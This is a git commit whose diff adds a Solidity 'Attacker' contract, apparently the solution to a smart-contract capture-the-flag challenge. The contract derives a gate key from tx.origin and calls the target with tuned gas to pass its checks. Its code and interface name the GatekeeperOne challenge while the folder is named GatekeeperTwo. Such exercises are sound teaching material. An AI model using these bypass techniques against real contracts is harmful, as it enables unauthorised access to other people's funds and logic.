b12ebbbb34d2914a130396472a9ac3f69c5185fb
Gakarot <startradingcentre@gmail.com>
2025-05-13 23:16:37 +0530

    Update solution.sol

--- Challenge_15_GatekeeperTwo/solution.sol
+++ Challenge_15_GatekeeperTwo/solution.sol
@@ -1,1 +1,23 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+
+interface GatekeeperOne {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract Attacker {
+
+    function attack(uint256 gas, address target) external {
+        GatekeeperOne gate = GatekeeperOne(target);
+
+        uint16 k16 = uint16(uint160(tx.origin));
+        uint64 k64 = uint64(1 << 63) + uint64(k16);
+
+        bytes8 key = bytes8(k64);
+        require(gas < 8191,"gas > 8191");
+        require(gate.enter{gas: 8191 * 10 + gas}(key),"Failed!");
+    }
+
+}
 
